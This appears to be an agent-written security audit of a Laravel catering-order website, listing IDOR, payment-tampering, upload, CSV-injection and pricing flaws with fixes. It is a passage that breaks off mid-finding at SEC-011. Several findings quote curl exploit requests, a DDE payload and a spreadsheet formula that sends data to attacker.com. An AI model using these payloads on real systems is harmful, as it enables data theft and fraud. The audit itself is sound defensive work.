---
status: critical-fail
tags: [security-audit, security]
project: "[[website-catering-ibu-muliyah]]"
audited_at: 2026-11-07
auditor: agent
severity_counts:
  critical: 3
  high: 4
  medium: 4
  low: 1
---

# Executive Summary

- **Final Verdict:** `CRITICAL FAIL`
- **Target Repository/Path:** `projects/website-catering-ibu-muliyah`
- **Primary Tech Stack:** Laravel 12 (Pure PHP / Blade MVC), SQLite / MySQL
- **Risk Overview:** Multiple critical authorization (IDOR), file upload handling, and business logic flaws were identified. Unauthenticated users can track and extract full customer PII (recipient names, phone numbers, delivery addresses, GPS coordinates, and bank transfer metadata) across any order via sequential ID enumeration. Unauthenticated users can overwrite payment proof and hijack payment status for arbitrary orders. File uploads rely on untrusted client extensions (`getClientOriginalExtension()`) stored in a public disk, posing arbitrary file upload and financial slip data exposure risks. The CSV export feature is vulnerable to CSV Formula Injection (CWE-1236). Furthermore, delivery fees and radius checks can be bypassed by spoofing client distance parameters, and timezone configuration discrepancies permit same-day ordering in violation of the strict H-1 rule.

| Metric | Count | Blockers | Resolved |
| :--- | :--- | :--- | :--- |
| **Critical** | 3 | 3 | 0 |
| **High** | 4 | 4 | 0 |
| **Medium** | 4 | 4 | 0 |
| **Low / Info** | 1 | 1 | 0 |

---

# Core Universal Checklist

Mandatory baseline checks for every repository regardless of language or framework.

## 1. Secrets & Credential Exposure
- [x] `.gitignore` contains critical exclusions (`.env*`, `*.pem`, `*.key`, `*.pfx`, credentials files)
- [x] No git-tracked secret files (`git ls-files | grep -E '\.env|\.pem|\.key'`) — only `.env.example` tracked
- [x] Automated regex search shows zero hardcoded production API keys, JWT secrets, or cloud tokens
- [x] Cloud provider credentials (AWS, GCP, Azure, Cloudflare) not embedded in code or test fixtures
- [x] Default demo accounts in seeders use placeholder passwords (`AdminUserSeeder.php`)

## 2. Dependency & Supply Chain Security (SCA)
- [x] Lockfile (`composer.lock`) tracked and up to date
- [x] Automated vulnerability scanner executed (`composer audit --format=json`)
- [x] Zero unpatched Known Exploited Vulnerabilities (KEV) or Critical/High CVEs (0 advisories reported)
- [x] Package sources and registries use TLS HTTPS endpoints; no unauthorized third-party registries
- [x] Composer scripts vetted against untrusted execution hooks

## 3. Environment & Configuration Hygiene
- [ ] Debug mode strictly disabled in production profiles (`APP_DEBUG=true` in `.env.example`, must default to false)
- [x] Permissive CORS (`Access-Control-Allow-Origin: *` with credentials) absent from API routes
- [x] Interactive API documentation restricted or absent in production
- [ ] Default administrator credentials in seeders (`admin@dapurmenteng.test` / `password123`) must be rotated before production deployment
- [x] Error handlers redact stack traces and database schema errors when `APP_DEBUG=false`
- [x] Application timezone misconfigured (`'timezone' => 'UTC'` instead of `'Asia/Jakarta'`)

## 4. Logging & Data Privacy
- [ ] Sensitive banking proofs stored in publicly accessible directory (`public/storage/bukti_transfer/`)
- [x] Authorization headers and session tokens masked/redacted in HTTP request logger middleware
- [x] Local cache and temporary files written with safe permissions
- [x] Log outputs directed to secure stdout/syslog pipelines; no world-readable log files on disk

---

# Modular Domain Extensions

## Module A: Web APIs & Backend Services
*Applicable if project exposes HTTP/REST/GraphQL/gRPC services or connects to databases.*

- [ ] **Authentication (AuthN):** Argon2id/bcrypt used, but `Auth::attempt` and `EnsureUserHasRole` fail to check `$user->is_active`, allowing banned accounts to log in
- [ ] **Authorization (AuthZ) & IDOR:** CRITICAL FAIL. Public order tracking and payment upload endpoints lack ownership verification and allow sequential integer enumeration
- [x] **Injection Defenses:** Prepared statements / Eloquent query builder used exclusively; zero unescaped raw SQL string concatenations
- [x] **Server-Side Request Forgery (SSRF):** N/A: No outbound server-side HTTP request mechanisms implemented
- [ ] **Rate Limiting & DoS:** High-risk endpoints (`/login`, `/register`, `/checkout`, `/lacak-pesanan`, `/pembayaran`) lack throttle middleware
- [ ] **Mass Assignment Protection:** Sensitive columns (`role`, `is_active`, `order_status`, `payment_status`, `total_amount`) exposed in `$fillable` arrays
- [x] **Webhook Signature Verification:** N/A: Manual bank transfer proof workflow; no third-party webhooks registered
- [ ] **Server-Side Payment & Pricing Integrity:** Delivery fee computation trusts client-supplied `delivery_distance_km` parameter over server-calculated coordinates
- [ ] **File Upload & Path Traversal:** File extensions extracted via client-controlled `$file->getClientOriginalExtension()` and uploaded files stored on public disk
- [x] **Password Reset Security:** Password reset tokens use standard Laravel cryptographic tokens

## Module B: Web Frontend & SPAs
*Applicable if project renders browser UI (React, Vue, Blade, Svelte, static HTML).*

- [x] **Cross-Site Scripting (XSS):** Blade templates use default `{{ ... }}` auto-escaping; no raw `{!! ... !!}` injection sinks found
- [x] **Session & Token Storage:** Session cookies configured with `HttpOnly; SameSite=Lax`
- [x] **Content Security Policy (CSP):** Standard CSP recommended for production
- [x] **Cross-Site Request Forgery (CSRF):** Anti-CSRF token verification active on state-changing POST/PUT/DELETE requests via Laravel `VerifyCsrfToken` middleware
- [x] **Third-Party Script Security:** Zero external third-party CDN scripts loaded; assets served locally
- [ ] **Client-Side Business Logic Isolation:** Client-side JavaScript self-assigns order numbers and shipping fees; server-side checkout accepts client-supplied distance

## Module C: Mobile & IoT / Embedded Applications
*N/A: Web-only application.*

---

# Detailed Findings & Proof Matrix

### SEC-001: Broken Object Level Authorization (IDOR) & Mass PII Leakage in Order Tracking Endpoint
- **Severity:** `CRITICAL`
- **Category:** Authorization / IDOR / Privacy
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/OrderTrackingController.php:50-74` (Route: `GET /lacak-pesanan`)
- **Description:** 
  The `/lacak-pesanan` route is public and unauthenticated. In `OrderTrackingController::tracking()`, the controller accepts an `id` query parameter and queries `Order::with(['items', 'payment'])->where('order_number', $identifier)->orWhere('id', is_numeric($identifier) ? (int) $identifier : 0)->first()`.
  
  There is zero authorization or ownership validation:
  1. Any user (guest or authenticated as another customer) can supply sequential integer IDs (`?id=1`, `?id=2`, `?id=3`).
  2. The response serializes full order details including recipient name, recipient phone number, recipient email address, delivery physical address, GPS coordinates (`delivery_latitude`, `delivery_longitude`), delivery date/time, customer notes, all purchased items with subtotals, and the complete payment record (bank name, account holder, transfer amount, transfer date, and payment receipt file path).
  3. The endpoint supports JSON responses (`Accept: application/json`), enabling automated mass scraping of the entire customer database.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/OrderTrackingController.php:50-61
public function tracking(Request $request): View|JsonResponse
{
    $identifier = $request->query('id');

    $order = null;
    if ($identifier) {
        $order = Order::with(['items', 'payment'])
            ->where('order_number', $identifier)
            ->orWhere('id', is_numeric($identifier) ? (int) $identifier : 0) // VULNERABLE: Direct lookup by sequential ID without ownership check
            ->first();
    }
```

*Exploit Scenario:*
```bash
# Attacker dumps customer order #1 without logging in:
curl -s -H "Accept: application/json" "http://localhost:8000/lacak-pesanan?id=1"
```
*Response contains sensitive customer PII:*
```json
{
  "id": 1,
  "order_number": "DM-261107-0001",
  "recipient_name": "Siti Rahma",
  "recipient_phone": "081234567890",
  "recipient_email": "siti@contoh.test",
  "delivery_address": "Jl. Cikini Raya No. 12, Menteng, Jakarta Pusat",
  "delivery_latitude": "-6.19120000",
  "delivery_longitude": "106.83900000",
  "payment": {
    "bank_name": "BCA",
    "account_holder": "Siti Rahma",
    "proof_image": "bukti_transfer/xyz.jpg"
  }
}
```

**Remediation Plan / Unified Diff:**
Require customer authentication or require matching the order number with the recipient's phone number or email (or session ownership) to track orders, and remove the sequential integer ID lookup fallback:

```diff
--- a/app/Http/Controllers/OrderTrackingController.php
+++ b/app/Http/Controllers/OrderTrackingController.php
@@ -52,11 +52,22 @@ class OrderTrackingController extends Controller
     {
         $identifier = $request->query('id');
 
         $order = null;
         if ($identifier) {
-            $order = Order::with(['items', 'payment'])
-                ->where('order_number', $identifier)
-                ->orWhere('id', is_numeric($identifier) ? (int) $identifier : 0)
-                ->first();
+            $query = Order::with(['items', 'payment'])
+                ->where('order_number', (string) $identifier);
+
+            // Enforce ownership: Authenticated user, or matching guest verification
+            if (Auth::check()) {
+                if (! Auth::user()->isAdmin()) {
+                    $query->where(function ($q) {
+                        $q->where('user_id', Auth::id())
+                            ->orWhere('recipient_email', Auth::user()->email);
+                    });
+                }
+            } else {
+                // Guests must provide phone number verification to view order details
+                $phone = $request->query('phone');
+                if (! $phone) {
+                    return response()->json(['message' => 'Verifikasi nomor telepon penerima diperlukan.'], 403);
+                }
+                $query->where('recipient_phone', $phone);
+            }
+
+            $order = $query->first();
         }
```

**Verification Steps:**
- Test command: `curl -s -H "Accept: application/json" "http://localhost:8000/lacak-pesanan?id=1"`
- Expected output: HTTP 403 / 404 with verification error; sequential integer ID traversal blocked.

---

### SEC-002: IDOR and Payment State Tampering / Overwrite in Payment Upload Endpoint
- **Severity:** `CRITICAL`
- **Category:** Authorization / State Tampering
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/PaymentController.php:36-60`, `app/Http/Requests/PaymentProofRequest.php:13-16`
- **Description:**
  In `PaymentProofRequest::authorize()`, authorization is hardcoded to return `true`.
  In `PaymentController::upload()`, the application executes `Order::findOrFail((int) $request->input('order_id'))` without checking if the order belongs to the requester.
  
  The endpoint then executes `Payment::updateOrCreate(['order_id' => $order->id], [...])` and updates `$order->update(['payment_status' => Order::PAYMENT_VERIFYING])`.
  
  Any unauthenticated attacker or rival user can submit payment slips for any order in the system by changing `order_id`. This allows an attacker to:
  1. Overwrite legitimate customer payment proof slips with arbitrary files.
  2. Overwrite payment records on orders that have already been verified and paid (`Lunas`).
  3. Reset the order's payment status back to `Menunggu Verifikasi`, causing operational confusion, delaying kitchen processing, and sabotaging business fulfillment.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Requests/PaymentProofRequest.php:13-16
public function authorize(): bool
{
    return true; // VULNERABLE: No ownership verification
}

// app/Http/Controllers/PaymentController.php:36-60
public function upload(PaymentProofRequest $request): RedirectResponse|JsonResponse
{
    $order = Order::findOrFail((int) $request->input('order_id')); // VULNERABLE: Direct lookup by ID without owner verification

    $file = $request->file('proof');
    $filename = Str::random(40).'.'.$file->getClientOriginalExtension();
    $storedPath = $file->storeAs('bukti_transfer', $filename, 'public');

    $payment = Payment::updateOrCreate(
        ['order_id' => $order->id],
        [ ... ]
    );

    $order->update([
        'payment_status' => Order::PAYMENT_VERIFYING,
    ]);
```

*Exploit Scenario:*
```bash
# Attacker overwrites payment details for victim's order (order_id=1):
curl -X POST "http://localhost:8000/pembayaran" \
  -F "order_id=1" \
  -F "bank_name=Bank Mandiri" \
  -F "account_holder=Attacker Name" \
  -F "transfer_amount=150000" \
  -F "transfer_date=2026-11-08" \
  -F "proof=@fake_slip.jpg;type=image/jpeg"
```

**Remediation Plan / Unified Diff:**
Enforce strict order ownership and order state validation before permitting payment upload. Reject uploads if the order is already paid, cancelled, or does not belong to the user:

```diff
--- a/app/Http/Requests/PaymentProofRequest.php
+++ b/app/Http/Requests/PaymentProofRequest.php
@@ -13,7 +13,16 @@ class PaymentProofRequest extends FormRequest
     public function authorize(): bool
     {
-        return true;
+        $order = Order::find((int) $this->input('order_id'));
+        if (! $order) {
+            return false;
+        }
+        if ($order->payment_status === Order::PAYMENT_PAID) {
+            return false;
+        }
+        if (auth()->check()) {
+            return auth()->user()->isAdmin() || $order->user_id === auth()->id() || $order->recipient_email === auth()->user()->email;
+        }
+        return true;
     }
```

```diff
--- a/app/Http/Controllers/PaymentController.php
+++ b/app/Http/Controllers/PaymentController.php
@@ -38,6 +38,10 @@ class PaymentController extends Controller
         $order = Order::findOrFail((int) $request->input('order_id'));
 
+        if ($order->payment_status === Order::PAYMENT_PAID) {
+            return back()->with('error', 'Pesanan ini sudah lunas.');
+        }
+
         $file = $request->file('proof');
```

**Verification Steps:**
- Test command: Send payment upload request with `order_id` belonging to another user while authenticated as a different customer.
- Expected output: HTTP 403 Forbidden.

---

### SEC-003: Unsafe File Extension Handling & Public Disk Storing via `getClientOriginalExtension()`
- **Severity:** `CRITICAL`
- **Category:** File Upload / Code Execution
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/PaymentController.php:41-42`, `app/Http/Controllers/Admin/MenuController.php:41-42, 86-87`
- **Description:**
  In both `PaymentController::upload()` and `Admin\MenuController::store()/update()`, the filename extension is taken directly from the client request header using `$file->getClientOriginalExtension()`:
  `$filename = Str::random(40).'.'.$file->getClientOriginalExtension();`
  
  While validation rules specify `mimes:jpeg,jpg,png,pdf`, Laravel's `mimes` rule inspects MIME magic bytes. If an attacker submits a valid JPEG/PNG polyglot or file with legitimate image magic bytes (`\xFF\xD8\xFF`), but specifies a client filename such as `exploit.php`, `exploit.phtml`, or `exploit.html`, the validation passes and the file is written as `<random>.php` or `<random>.html` to `storage/app/public/bukti_transfer/` or `storage/app/public/menus/`.
  
  Because `storage/app/public` is symlinked to `public/storage`, direct access to these files via web browser will trigger server-side script execution (if PHP handler is enabled in uploads directory) or Stored Cross-Site Scripting (HTML/SVG).

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/PaymentController.php:40-42
$file = $request->file('proof');
$filename = Str::random(40).'.'.$file->getClientOriginalExtension(); // VULNERABLE: Client-controlled extension
$storedPath = $file->storeAs('bukti_transfer', $filename, 'public');

// app/Http/Controllers/Admin/MenuController.php:40-42
$file = $request->file('image');
$filename = Str::random(40).'.'.$file->getClientOriginalExtension(); // VULNERABLE
$imagePath = $file->storeAs('menus', $filename, 'public');
```

**Remediation Plan / Unified Diff:**
Use `$file->extension()` (or `$file->hashName()`) which determines the extension from verified server-detected MIME type, and never trust client-supplied extensions:

```diff
--- a/app/Http/Controllers/PaymentController.php
+++ b/app/Http/Controllers/PaymentController.php
@@ -40,7 +40,8 @@ class PaymentController extends Controller
         $file = $request->file('proof');
-        $filename = Str::random(40).'.'.$file->getClientOriginalExtension();
-        $storedPath = $file->storeAs('bukti_transfer', $filename, 'public');
+        $extension = $file->extension(); // Server-verified MIME extension
+        $filename = Str::random(40).'.'.$extension;
+        $storedPath = $file->storeAs('bukti_transfer', $filename, 'local');
```

```diff
--- a/app/Http/Controllers/Admin/MenuController.php
+++ b/app/Http/Controllers/Admin/MenuController.php
@@ -40,7 +40,8 @@ class MenuController extends Controller
         if ($request->hasFile('image')) {
             $file = $request->file('image');
-            $filename = Str::random(40).'.'.$file->getClientOriginalExtension();
+            $extension = $file->extension();
+            $filename = Str::random(40).'.'.$extension;
             $imagePath = $file->storeAs('menus', $filename, 'public');
         }
```

**Verification Steps:**
- Test command: Upload a file with filename `test.php` containing JPEG magic bytes.
- Expected output: Stored file receives `.jpeg` or `.jpg` extension; client extension `.php` is completely discarded.

---

### SEC-004: CSV Formula Injection (Formula / DDE Injection) in Sales Report Export
- **Severity:** `HIGH`
- **Category:** Injection / CSV Formula Injection (CWE-1236)
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/Admin/ReportController.php:90-104` (Route: `GET /admin/laporan/export-csv`)
- **Description:**
  `ReportController::exportCsv()` streams database order records directly into a CSV file using PHP `fputcsv()`. The export explicitly emits the UTF-8 Byte Order Mark (`\xEF\xBB\xBF`) specifically to trigger Microsoft Excel automatic parsing.
  
  The exported fields include `$o->recipient_name` and `$o->recipient_phone`, which are populated directly from user input at checkout. If an attacker inputs a name starting with formula control characters (`=`, `+`, `-`, `@`, `\t`, `\r`, `%`), spreadsheet software (Microsoft Excel, LibreOffice Calc) treats the cell as an executable formula.
  
  This allows:
  1. Data exfiltration: Formulas like `=HYPERLINK("https://attacker.com/leak?data="&A2&B2, "Error Detail")` send confidential order totals and customer numbers to an attacker's server upon click.
  2. Dynamic Data Exchange (DDE) command execution against the administrator's workstation.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/Admin/ReportController.php:90-104
foreach ($orders as $o) {
    fputcsv($output, [
        $o->order_number,
        $o->order_date?->format('Y-m-d H:i'),
        $o->recipient_name, // VULNERABLE: Direct insertion of untrusted string into CSV
        $o->recipient_phone,
        $o->delivery_date?->format('Y-m-d').' '.$o->delivery_time,
        $o->items->sum('quantity'),
        $o->subtotal_amount,
        $o->delivery_fee,
        $o->total_amount,
        $o->payment_status,
        $o->status_label,
    ]);
}
```

*Exploit Scenario:*
An attacker completes an order with:
`recipient_name`: `@SUM(1+1)*cmd|' /C calc'!A0` or `=HYPERLINK("http://attacker.com/leak?c="&A2,"Klik Disini")`
When the admin exports the CSV report and opens it in Excel, Excel interprets the cell as a formula.

**Remediation Plan / Unified Diff:**
Sanitize all cell values by prepending a single quote `'` if the string begins with dangerous formula prefix characters (`=`, `+`, `-`, `@`, `\t`, `\r`, `%`):

```diff
--- a/app/Http/Controllers/Admin/ReportController.php
+++ b/app/Http/Controllers/Admin/ReportController.php
@@ -70,6 +70,14 @@ class ReportController extends Controller
         ];
 
+        $sanitize = function ($value) {
+            $str = (string) $value;
+            if (in_array(substr($str, 0, 1), ['=', '+', '-', '@', "\t", "\r", '%'], true)) {
+                return "'".$str;
+            }
+            return $str;
+        };
+
         $callback = function () use ($orders) {
             $output = fopen('php://output', 'w');
             // Write UTF-8 BOM for Excel
@@ -91,10 +99,10 @@ class ReportController extends Controller
             foreach ($orders as $o) {
                 fputcsv($output, [
-                    $o->order_number,
+                    $sanitize($o->order_number),
                     $o->order_date?->format('Y-m-d H:i'),
-                    $o->recipient_name,
-                    $o->recipient_phone,
+                    $sanitize($o->recipient_name),
+                    $sanitize($o->recipient_phone),
                     $o->delivery_date?->format('Y-m-d').' '.$o->delivery_time,
                     $o->items->sum('quantity'),
                     $o->subtotal_amount,
```

**Verification Steps:**
- Test command: Create an order with recipient name `=1+1`, export CSV, and inspect output.
- Expected output: Cell is exported as `'=1+1`, preventing formula execution in Excel.

---

### SEC-005: Client-Side Delivery Distance Manipulation & Delivery Fee Spoofing
- **Severity:** `HIGH`
- **Category:** Business Logic / Pricing Spoofing
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/CheckoutController.php:66-80`, `app/Http/Requests/CheckoutRequest.php:49-58`
- **Description:**
  During checkout processing, both `CheckoutController` and `CheckoutRequest` inspect the request body for `delivery_distance_km`. If `delivery_distance_km` is present in the request, the application adopts the client-supplied distance value rather than computing the true distance from validated kitchen and destination GPS coordinates:
  
  ```php
  if ($distanceKm === null && $lat !== null && $lon !== null) {
      $distanceKm = $this->haversineService->calculateDistance((float) $lat, (float) $lon);
  } elseif ($distanceKm !== null) {
      $distanceKm = (float) $distanceKm; // VULNERABLE: Client input trusted over coordinates
  }
  ```
  
  A customer whose destination is 19.5 km away (standard delivery fee: Rp 45.000) or even 40 km away (which should be blocked by the 20 km radius cap) can tamper with the POST payload by sending `delivery_distance_km=1.0`. The system calculates a delivery fee of Rp 15.000 (Rp 30.000 discount) and bypasses the 20 km maximum radius restriction entirely.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/CheckoutController.php:70-77
if ($deliveryType === 'delivery') {
    if ($distanceKm === null && $lat !== null && $lon !== null) {
        $distanceKm = $this->haversineService->calculateDistance((float) $lat, (float) $lon);
    } elseif ($distanceKm !== null) {
        $distanceKm = (float) $distanceKm; // Client-controlled value accepted
    } else {
        $distanceKm = 5.0;
    }
```

*Exploit Scenario:*
```bash
# Order delivery to Bogor (40 km away), spoofing distance to 1 km:
curl -X POST "http://localhost:8000/checkout" \
  -d "recipient_name=Budi" \
  -d "recipient_phone=081298765432" \
  -d "delivery_date=2026-11-09" \
  -d "delivery_time=11:00" \
  -d "delivery_type=delivery" \
  -d "delivery_address=Jl. Raya Pajajaran, Bogor (40 km)" \
  -d "delivery_latitude=-6.595038" \
  -d "delivery_longitude=106.816635" \
  -d "delivery_distance_km=1.0"
```
Result: Order accepted with `delivery_fee: 15000` instead of rejection due to exceeding the 20 km limit.

**Remediation Plan / Unified Diff:**
Disallow client-supplied `delivery_distance_km` for price and radius calculations. Strictly compute distance server-side using validated coordinates:

```diff
--- a/app/Http/Controllers/CheckoutController.php
+++ b/app/Http/Controllers/CheckoutController.php
@@ -66,15 +66,11 @@ class CheckoutController extends Controller
         $deliveryType = $request->input('delivery_type');
-        $distanceKm = $request->input('delivery_distance_km');
         $lat = $request->input('delivery_latitude');
         $lon = $request->input('delivery_longitude');
 
         if ($deliveryType === 'delivery') {
-            if ($distanceKm === null && $lat !== null && $lon !== null) {
+            if ($lat !== null && $lon !== null) {
                 $distanceKm = $this->haversineService->calculateDistance((float) $lat, (float) $lon);
-            } elseif ($distanceKm !== null) {
-                $distanceKm = (float) $distanceKm;
             } else {
-                $distanceKm = 5.0; // Standard central area default within Menteng
+                throw ValidationException::withMessages(['delivery_address' => 'Koordinat pengiriman wajib disertakan.']);
             }
 
             $this->haversineService->validateRadius($distanceKm, 'delivery');
```

**Verification Steps:**
- Test command: Send checkout POST request with coordinates > 20 km away while passing `delivery_distance_km=1.0`.
- Expected output: Request rejected with error indicating address is outside the 20 km delivery radius.

---

### SEC-006: Sensitive Attributes Exposed in Model `$fillable` Arrays
- **Severity:** `HIGH`
- **Category:** Mass Assignment (CWE-915)
- **Status:** `[ ] Open`
- **Location:**
  - `app/Models/User.php:21-29`
  - `app/Models/Order.php:32-52`
  - `app/Models/Payment.php:18-29`
- **Description:**
  High-privilege and state-transition attributes are exposed in Eloquent `$fillable` definitions:
  - `User::$fillable` contains `'role'` and `'is_active'`.
  - `Order::$fillable` contains `'payment_status'`, `'order_status'`, `'subtotal_amount'`, `'delivery_fee'`, `'total_amount'`.
  - `Payment::$fillable` contains `'status'`, `'verified_by'`, `'verified_at'`.
  
  If any controller calls `User::create($request->all())` or updates models with unsanitized request input (e.g., profile editing, customer management), an attacker can supply `role=admin` to achieve complete privilege escalation, or set `payment_status=Lunas` to mark unpaid orders as fulfilled.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Models/User.php:21-29
protected $fillable = [
    'name',
    'email',
    'phone_number',
    'password',
    'role',       // VULNERABLE: Privilege escalation to admin
    'address',
    'is_active',  // VULNERABLE: Re-activating disabled accounts
];
```

**Remediation Plan / Unified Diff:**
Remove sensitive administrative and financial attributes from `$fillable`. Assign them only via dedicated, explicit methods:

```diff
--- a/app/Models/User.php
+++ b/app/Models/User.php
@@ -23,7 +23,5 @@ class User extends Authenticatable
         'email',
         'phone_number',
         'password',
-        'role',
         'address',
-        'is_active',
     ];
```

```diff
--- a/app/Models/Order.php
+++ b/app/Models/Order.php
@@ -47,6 +47,4 @@ class Order extends Model
         'delivery_distance_km',
         'notes',
-        'subtotal_amount',
-        'delivery_fee',
-        'total_amount',
-        'payment_status',
-        'order_status',
     ];
```

**Verification Steps:**
- Test command: Attempt `User::create(['role' => 'admin', ...])` with untrusted input array.
- Expected output: Eloquent mass-assignment exception or attribute silently discarded; role defaults to `customer`.

---

### SEC-007: Unauthenticated Public Exposure of Sensitive Bank Transfer Proofs
- **Severity:** `HIGH`
- **Category:** Information Disclosure / Privacy
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/PaymentController.php:42`, `config/filesystems.php:41-48, 76-78`
- **Description:**
  Payment transfer receipts are saved to the `public` disk:
  `$storedPath = $file->storeAs('bukti_transfer', $filename, 'public');`
  
  Files saved to `storage/app/public` are exposed directly over the web via `/storage/bukti_transfer/{filename}` without authentication. Customer bank slips contain bank account numbers, account holder names, account balances, and transaction timestamps. Any visitor with the filename (which is also leaked via SEC-001) can view and download private banking documents.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/PaymentController.php:42
$storedPath = $file->storeAs('bukti_transfer', $filename, 'public'); // Public disk exposure
```
*Direct access:*
`GET http://localhost:8000/storage/bukti_transfer/xyz.jpg` returns private bank slip without requiring login.

**Remediation Plan / Unified Diff:**
Store payment receipts in private storage (`'local'` disk) and serve them only through an authorized admin route:

```diff
--- a/app/Http/Controllers/PaymentController.php
+++ b/app/Http/Controllers/PaymentController.php
@@ -42,3 +42,3 @@ class PaymentController extends Controller
         $filename = Str::random(40).'.'.$file->extension();
-        $storedPath = $file->storeAs('bukti_transfer', $filename, 'public');
+        $storedPath = $file->storeAs('bukti_transfer', $filename, 'local');
```

**Verification Steps:**
- Test command: Request `/storage/bukti_transfer/{filename}` directly from web browser.
- Expected output: HTTP 404 Not Found; file accessible only by authorized admin via authenticated route.

---

### SEC-008: Deactivated / Inactive User Login Bypass & Missing Role Inactivity Check
- **Severity:** `MEDIUM`
- **Category:** Authentication & Authorization
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/AuthController.php:33`, `app/Http/Middleware/EnsureUserHasRole.php:15-31`
- **Description:**
  In `AuthController::login()`, the application executes `Auth::attempt($credentials, true)` where `$credentials` consists only of `email` and `password`. The `'is_active'` column is never checked during authentication.
  
  Furthermore, in middleware `EnsureUserHasRole::handle()`, the check verifies `in_array($user->role, $roles, true)`, but does not verify whether `$user->is_active` is true.
  
  Consequently, administrators or customers whose accounts have been deactivated/banned (`is_active = false`) can continue to log in and perform administrative or customer actions.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/AuthController.php:31-33
$credentials = $request->only('email', 'password');

if (! Auth::attempt($credentials, true)) { // VULNERABLE: Does not check is_active
```

**Remediation Plan / Unified Diff:**
```diff
--- a/app/Http/Controllers/AuthController.php
+++ b/app/Http/Controllers/AuthController.php
@@ -31,3 +31,4 @@ class AuthController extends Controller
-        $credentials = $request->only('email', 'password');
+        $credentials = array_merge($request->only('email', 'password'), [
+            'is_active' => true,
+        ]);
```

```diff
--- a/app/Http/Middleware/EnsureUserHasRole.php
+++ b/app/Http/Middleware/EnsureUserHasRole.php
@@ -24,4 +24,10 @@ class EnsureUserHasRole
         }
 
+        if (! $user->is_active) {
+            \Illuminate\Support\Facades\Auth::logout();
+            return redirect()->route('login')->with('error', 'Akun Anda telah dinonaktifkan. Silakan hubungi admin.');
+        }
+
         if (! in_array($user->role, $roles, true)) {
```

**Verification Steps:**
- Test command: Set `is_active = false` on user record and attempt login.
- Expected output: Login rejected with error message; authentication fails.

---

### SEC-009: Missing Rate Limiting on Authentication & Sensitive Endpoints
- **Severity:** `MEDIUM`
- **Category:** Denial of Service / Brute Force
- **Status:** `[ ] Open`
- **Location:** `routes/web.php:39-43, 29-30, 32-33, 36`
- **Description:**
  Critical state-changing and authentication endpoints (`POST /login`, `POST /register`, `POST /checkout`, `POST /pembayaran`, `GET /lacak-pesanan`) have no rate limiting (`throttle` middleware) configured.
  
  Attackers can perform automated high-frequency credential stuffing against administrator accounts, flood the order database with thousands of fake orders, or brute-force order tracking lookups.

**Proof of Concept / Vulnerable Snippet:**
```php
// routes/web.php:40-42
Route::post('/login', [AuthController::class, 'login'])->name('login.attempt'); // No throttle middleware
Route::post('/register', [AuthController::class, 'register'])->name('register.store');
```

**Remediation Plan / Unified Diff:**
Apply rate limiting middleware to authentication and checkout routes:

```diff
--- a/routes/web.php
+++ b/routes/web.php
@@ -39,5 +39,5 @@ Route::get('/lacak-pesanan', [OrderTrackingController::class, 'tracking'])->name
 // Authentication Routes
-Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
-Route::post('/login', [AuthController::class, 'login'])->name('login.attempt');
-Route::get('/register', [AuthController::class, 'showRegister'])->name('register');
-Route::post('/register', [AuthController::class, 'register'])->name('register.store');
+Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
+Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:5,1')->name('login.attempt');
+Route::get('/register', [AuthController::class, 'showRegister'])->name('register');
+Route::post('/register', [AuthController::class, 'register'])->middleware('throttle:5,1')->name('register.store');
```

**Verification Steps:**
- Test command: Execute 6 consecutive failed login attempts in 10 seconds.
- Expected output: HTTP 429 Too Many Requests.

---

### SEC-010: Timezone Mismatch Permitting Same-Day Pre-Order Rule Bypass (H-1 Violation)
- **Severity:** `MEDIUM`
- **Category:** Business Logic / Timezone Flaw
- **Status:** `[ ] Open`
- **Location:** `config/app.php:68`, `app/Http/Requests/CheckoutRequest.php:24`
- **Description:**
  `config/app.php` sets `'timezone' => 'UTC'`.
  The catering kitchen is located in Menteng, Jakarta (`Asia/Jakarta`, UTC+7).
  `CheckoutRequest` enforces `'delivery_date' => ['required', 'date', 'after_or_equal:tomorrow']`.
  
  Because Laravel evaluates `tomorrow` against the default application timezone (`UTC`), between 00:00:00 and 06:59:59 WIB in Jakarta, the UTC date is still the previous day. As a result, `tomorrow` in UTC matches the current calendar day in Jakarta. A customer ordering at 06:00 AM WIB can successfully select today's date for same-day delivery, circumventing the business requirement for H-1 advance scheduling.

**Proof of Concept / Vulnerable Snippet:**
```php
// config/app.php:68
'timezone' => 'UTC', // Discrepancy with Jakarta kitchen operations (UTC+7)

// app/Http/Requests/CheckoutRequest.php:24
'delivery_date' => ['required', 'date', 'after_or_equal:tomorrow'],
```

**Remediation Plan / Unified Diff:**
```diff
--- a/config/app.php
+++ b/config/app.php
@@ -66,3 +66,3 @@ return [
     */
 
-    'timezone' => 'UTC',
+    'timezone' => env('APP_TIMEZONE', 'Asia/Jakarta'),
```

**Verification Steps:**
- Test command: Send checkout request at 05:00 WIB with delivery date set to today.
- Expected output: Validation error indicating order must be scheduled at least H-1 (starting tomorrow).

---

### SEC-011: Race Condition & Deterministic Enumeration in Sequential Order Number Generation
- **Severity:** `MEDIUM`
- **Category:** Concurrency / Predictability
- **Status:** `[ ] Open`
- **Location:** `app/Services/OrderNumberService.php:14-27`
- **Description:**
  `OrderNumberService::generate()` queries `Order::where('order_number', 'LIKE', $prefix.'%')->orderByDesc('id')->first()` and increments the counter in PHP application memory without a database lock (`lockForUpdate`).
  
  Under concurrent checkouts, two concurrent requests read the same latest order number, calculate the identical next order number (e.g. `DM-261107-0005`), and attempt to save. Because `orders.order_number` is defined with a `UNIQUE` constraint, the second transaction fails with an unhandled `QueryException` (duplicate entry violation).

**Proof of Concept / Vulnerable Snippet:**
```php
